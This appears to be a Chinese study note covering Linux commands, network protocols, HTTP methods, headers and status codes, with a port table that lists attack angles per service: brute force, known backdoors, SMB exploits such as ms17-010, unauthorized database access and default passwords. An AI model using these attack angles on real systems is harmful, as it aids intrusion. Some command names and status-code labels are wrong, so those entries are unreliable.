#创建目录                                              rm #删除文件  rm -rf  #删除目录\nrmdir #删除目录  cp #复制文件 mv #移动文件                     passwd #修改管理员密码\nuseradd #添加管理员                                           dpkg -i 安装包.dpd #安装dpd格式的文件\ntar -zxvf #解压缩                                             adp install -f 安装依赖包\n系统\nuname -a #查看内核/os/cpu信息                                head -n 1 /etc/isiue #查看os版本\ncat  /proc/cpuinfo #查看cpu信息                              hostname #查看计算机名\nenv #查看环境变量                                            dmidecode #查看硬件详细信息\n资源\nfree -m #查看内存使用量和交换区使用量                          df -h #查看分区使用情况\ndu -sh #查看指定目录的大小                                    uptime #查看系统运行时间 用户数 负载\n网络\nifconfig #查看所有网络接口的属性                               iptables -L #查看防火墙设置\nroute -n 查看路由器                                           netstat -lntp #查看所有监听端口\nnetstat -antp #查看网络统计信息                                lsof #查看网络信息\n进程\nps -ef #查看所有进程                                           top #实时显示进程状态\n服务\nservice app status #查看服务状态                               service app start #开启服务\nservice app stop #关闭服务                                     service app restart #重启服务\nupdate -rc.d app enable / disable / disable number  #加到开机启动 / #取销开机启动 /# 设置优先级\n```\n\n### 网络服务/端口/http请求/抓包/状态码\n\n网络服务\n\nTCP   -传输控制协议 ：用于从应用程序到网络的数据传送控制。\n\nIP      -网际协议：负责计算机之间的通信\n\nHTTP -超文本传输协议 ：用于从www服务器传输超文本html到本地浏览器的传输协议 默认端口80.\n\nHTTPS-安全的超文本传输协议：负责在web服务器到web浏览器之间的安全通信。\n\nFTP    -文件传输协议：提供交互式访问，允许客户指明文件类型和格式，并允许文件具有存取权限。\n\nSMTP -邮件传输协议：规定了在两个互相通信的smtp进程之间应如何交换信息。三个阶段：建立连接、邮件传输、连接释放。\n\nPOP3 -邮件读取协议：用来接收电子邮件。Telent -远程终端协议：一个简单的远程终端协议。\n\n| **端口**                          | **服务**                               | **渗透测试**                                                 |\n| --------------------------------- | -------------------------------------- | ------------------------------------------------------------ |\n| tcp 20,21                         | FTP（文件传输协议）                    | 允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd   1.3.5),各类后门(proftpd,vsftp 2.3.4) |\n| tcp 22                            | SSH （安全外壳协议 ）                  | 可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输等等 |\n| tcp 23                            | Telnet （ 远程终端协议）               | 爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令               |\n| tcp 25                            | SMTP（简单邮件传输协议）               | 邮件伪造,vrfy/expn查询邮件用户信息,可使用smtp-user-enum工具来自动跑 |\n| tcp/udp 53                        | DNS（域名系统）                        | 允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控  |\n| tcp/udp 69                        | TFTP （简单文件传送协议 ）             | 尝试下载目标及其的各类重要配置文件                           |\n| tcp 80-89,443,8440-8450,8080-8089 | 各种常用的Web服务端口                  | 可尝试经典的topn,vpn,owa,webmail,目标oa,各类Java控制台,各类服务器Web管理面板,各类Web中间件漏洞利用,各类Web框架漏洞利用等等…… |\n| tcp 110                           | POP3（邮局协议版本3 ）                 | 可尝试爆破,嗅探                                              |\n| tcp 111,2049                      | NFS（网络文件系统）                    | 权限配置不当                                                 |\n| tcp 137,139,445                   | SMB（NETBIOS协议）                     | 可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等…… |\n| tcp 143                           | IMAP（邮件访问协议）                   | 可尝试爆破                                                   |\n| udp 161                           | SNMP（简单网络管理协议）               | 爆破默认团队字符串,搜集目标内网信息                          |\n| tcp 389                           | LDAP（ 轻量目录访问协议 ）             | ldap注入,允许匿名访问,弱口令                                 |\n| tcp 512,513,514                   | Linux rexec （远程登录）               | 可爆破,rlogin登陆                                            |\n| tcp 873                           | Rsync （数据镜像备份工具）             | 匿名访问,文件上传                                            |\n| tcp 1194                          | OpenVPN（虚拟专用通道）                | 想办法钓VPN账号,进内网                                       |\n| tcp 1352                          | Lotus（Lotus软件）                     | 弱口令,信息泄漏,爆破                                         |\n| tcp 1433                          | SQL Server（数据库管理系统）           | 注入,提权,sa弱口令,爆破                                      |\n| tcp 1521                          | Oracle（甲骨文数据库）                 | tns爆破,注入,弹shell…                                        |\n| tcp 1500                          | ISPmanager（ 主机控制面板）            | 弱口令                                                       |\n| tcp 1723                          | PPTP（点对点隧道协议 ）                | 爆破,想办法钓VPN账号,进内网                                  |\n| tcp 2082,2083                     | cPanel （虚拟机控制系统 ）             | 弱口令                                                       |\n| tcp 2181                          | ZooKeeper（分布式系统的可靠协调系统 ） | 未授权访问                                                   |\n| tcp 2601,2604                     | Zebra （zebra路由）                    | 默认密码zerbra                                               |\n| tcp 3128                          | Squid （代理缓存服务器）               | 弱口令                                                       |\n| tcp 3312,3311                     | kangle（web服务器）                    | 弱口令                                                       |\n| tcp 3306                          | MySQL（数据库）                        | 注入,提权,爆破                                               |\n| tcp 3389                          | Windows rdp（桌面协议）                | shift后门[需要03以下的系统],爆破,ms12-020                    |\n| tcp 3690                          | SVN（开放源代码的版本控制系统）        | svn泄露,未授权访问                                           |\n| tcp 4848                          | GlassFish（应用服务器）                | 弱口令                                                       |\n| tcp 5000                          | Sybase/DB2（数据库）                   | 爆破,注入                                                    |\n| tcp 5432                          | PostgreSQL（数据库）                   | 爆破,注入,弱口令                                             |\n| tcp 5900,5901,5902                | VNC（虚拟网络控制台，远控）            | 弱口令爆破                                                   |\n| tcp 5984                          | CouchDB（数据库）                      | 未授权导致的任意指令执行                                     |\n| tcp 6379                          | Redis（数据库）                        | 可尝试未授权访问,弱口令爆破                                  |\n| tcp 7001,7002                     | WebLogic（WEB应用系统）                | Java反序列化,弱口令                                          |\n| tcp 7778                          | Kloxo（虚拟主机管理系统）              | 主机面板登录                                                 |\n| tcp 8000                          | Ajenti（Linux服务器管理面板）          | 弱口令                                                       |\n| tcp 8443                          | Plesk（虚拟主机管理面板）              | 弱口令                                                       |\n| tcp 8069                          | Zabbix （系统网络监视）                | 远程执行,SQL注入                                             |\n| tcp 8080-8089                     | Jenkins,JBoss （应用服务器）           | 反序列化,控制台弱口令                                        |\n| tcp 9080-9081,9090                | WebSphere（应用服务器）                | Java反序列化/弱口令                                          |\n| tcp 9200,9300                     | ElasticSearch （Lucene的搜索服务器）   | 远程执行                                                     |\n| tcp 11211                         | Memcached（缓存系统）                  | 未授权访问                                                   |\n| tcp 27017,27018                   | MongoDB（数据库）                      | 爆破,未授权访问                                              |\n| tcp 50070,50030                   | Hadoop（分布式文件系统）               | 默认端口未授权访问                                           |\n\n3.http请求与请求/响应正文\n\n（1.）8种请求类型介绍\n\n1.GET 向特定的资源发出请求\n\n2.POST 向指定的资源提交数据进行请求，数据包含在请求体内，POST请求可能会导致新资源的创建和已有资源的更改。\n\n3.OPITONS 返回服务器针对特定资源所支持的HTTP请求方法。 \n\n4.HEAD 向服务器索要与GET请求相一致的响应，只不过响应体不会被返回。 \n\n5.PUT 向指定资源位置上传其最新内容。\n\n6.DELETE 请求服务器删除Request-URL所标识的资源。 \n\n7.TRACE 回显服务器收到的请求，主要用于测试或诊断。 \n\n8.CONNECT HTTP/1.1协议中预留给能将连接改为管道方式的代理服务器。 \n\n（2.）http请求响应原理\n\n1.客户端与服务端建立连接 tcp三次握手\n\n2.客户端发送一个请求给服务器\n\n3..服务端返回一个响应信息给客户端4.释放连接 tcp四次挥手\n\n5.客户端接收服务端返回的信息通过浏览器显示在用户的显示屏上\n\n（3.）http请求响应过程\n\n1.域名解析 \n\n2.发起tcp三次握手 \n\n3.建立tcp连接后发起http请求 \n\n4.服务器段响应http请求,浏览器得到html代码\n\n5.浏览器解析html代码，并请求html代码中的资源\n\n6.浏览器对页面进行渲染呈现给用户\n\n（4.）http请求报文\n\n1.请求行 （方法字段、URL字段、http版本协议）\n\n2.请求头部 \n\n3.空行 （\\r\\n 告诉服务器请求头部到此为止）\n\n4.请求数据 （get为空 post为要提交的数据）\n\n（5.）常见的请求头\n\n| 请求头字段                       | 含义                                                         |\n| -------------------------------- | ------------------------------------------------------------ |\n| Accept                           | 浏览器可接受的MIME类型                                       |\n| Accept-charset                   | 浏览器可以接受的字符集                                       |\n| Accept-Encoding                  | 浏览器能够继续解码的数据编码方式                             |\n| Accept-language                  | 浏览器所希望的语言种类                                       |\n| Authorization                    | 授权信息                                                     |\n| Content-length                   | 表示请求消息正文的长度                                       |\n| User-Agent                       | 内容包含发出请求的用户信息、浏览器类型                       |\n| Cookie                           | 客户机通过这个头可以向服务器发送带数据的请求                 |\n| Pragma                           | 指定no-cache值表示服务器必须返回一个刷新后的文档             |\n| From                             | 请求发送者的email地址                                        |\n| connection                       | 处理完这次请求后是否断开连接。值为“keep-Alive”或者是http1.1就可以持续连接 |\n| Referer                          | 客户机通过这个头告诉服务器，它是从哪个资源来访问服务器的     |\n| Range                            | 头域可以请求实体的一个或多个字范围                           |\n| UA-Pixels, UA-color,UA-os,UA-cpu | 由某些版本的IE浏览器所发送的非标准的请求头，表示屏幕大小、颜色深度、操作系统和CPU类型。 |\n\n（6.）http响应报文\n\n1.响应行（协议版本、状态码、及描述）\n\n2.响应头\n\n3.响应体（响应的消息体，纯数据、html页面、js代码）\n\n4.状态码\n\n（1.）客户方错误\n\n| 状态码 | 英文名称            | 中文描述                                                 |\n| ------ | ------------------- | -------------------------------------------------------- |\n| 100    | continue            | 继续，客户端应继续请求                                   |\n| 101    | switching proticols | 切换协议，服务端根据客户端的请求切换协议，只能切换更高级 |\n\n（2.）成功\n\n| 状态码 | 英文名称              | 中文描述                                           |\n| ------ | --------------------- | -------------------------------------------------- |\n| 200    | ok                    | 请求成功                                           |\n| 201    | created               | 已建立，成功请求并建立了新的资源                   |\n| 202    | accepeted             | 已经接受请求，但为完成处理                         |\n| 203    | non-authoritative ifm | 请求成功，但是返回的meta信息不再原始服务器，是副本 |\n| 204    | no content            | 无内容 ，服务器成功处理，但未返回内容              |\n| 205    | reset content         | 重置内容，服务器处理成功，用户终端应重置文视图     |\n| 206    | reset content         | 部分内容，服务器成功处理了部分内容                 |\n\n（3.）重定向\n\n| 状态码 | 英文名称           | 中文描述                                                     |\n| ------ | ------------------ | ------------------------------------------------------------ |\n| 300    | multiple choices   | 多种选择，请求的资源可包含多个位置，相应可返回一个资源特征与地址的列表用于用户选择。 |\n| 301    | moved permanentli  | 永久移动。请求的资源已被永久的移动到新的url，返回信息包括新的url |\n| 302    | found              | 临时移动，与301类似，但资源只是临时被移动。                  |\n| 303    | see other          | 查看其他地址。                                               |\n| 304    | not modified       | 未修改。所请求的资源未修改，返回此状态码时不会返回任何资源。 |\n| 305    | user proxy         | 使用代理，所请求的资源必须通过代理访问                       |\n| 306    | unused             | 以及被废弃的http状态码                                       |\n| 307    | temporary redirect | 与302类似 使用get请求重定向。                                |\n\n（4.）客户方错误\n\n| 状态码 | 英语名称                        | 中文描述                                                     |\n| ------ | ------------------------------- | ------------------------------------------------------------ |\n| 400    | bad request                     | 客户端请求的语法错误，服务器无法理解。                       |\n| 401    | Unauthorized                    | 请求要求用户的身份认证                                       |\n| 402    |                                 | 保留                                                         |\n| 403    | forbidden                       | 服务器理解客户端请求，但是拒绝执行此请求                     |\n| 404    | not found                       | 服务器无法找到资源                                           |\n| 405    | method not allowed              | 客户端请求中的方法被禁止                                     |\n| 406    | Not Acceptable                  | 服务器无法根据客户端请求的内容特性完成请求                   |\n| 407    | Proxy Authentication Required   | 请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权 |\n| 408    | Request Time-out                | 服务器等待客户端发送的请求时间过长，超时                     |\n| 409    | Conflict                        | 服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突 |\n| 410    | Gone                            | 客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置 |\n| 411    | Length Required                 | 服务器无法处理客户端发送的不带Content-Length的请求信息       |\n| 412    | Precondition Failed             | 客户端请求信息的先决条件错误                                 |\n| 413    | Request Entity Too Large        | 由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息 |\n| 414    | Request-URI Too Large           | 请求的URI过长（URI通常为网址），服务器无法处理               |\n| 415    | Unsupported Media Type          | 服务器无法处理请求附带的媒体格式                             |\n| 416    | Requested range not satisfiable | 客户端请求的范围无效                                         |\n| 417    | Expectation Failed              | 服务器无法满足Expect的请求头信息                             |\n\n（5.）服务器错误\n\n| 状态码 | 英文名称                   | 中文描述                                                     |\n| ------ | -------------------------- | ------------------------------------------------------------ |\n| 500    | Internal Server Error      | 服务器内部错误，无法完成请求                                 |\n| 501    | Not Implemented            | 服务器不支持请求的功能，无法完成请求                         |\n| 502    | Bad Gateway                | 作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应 |\n| 503    | Service Unavailable        | 由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中 |\n| 504    | Gateway Time-out           | 充当网关或代理的服务器，未及时从远端服务器获取请求           |\n| 505    | HTTP Version not supported | 服务器不支持请求的HTTP协议的版本，无法完成处理               |\n\n未完待续......\n\n人们只愿看到自己想看到的一切，分不清是非对错，黑白颠倒。--Hades","tags":["笔记"]}]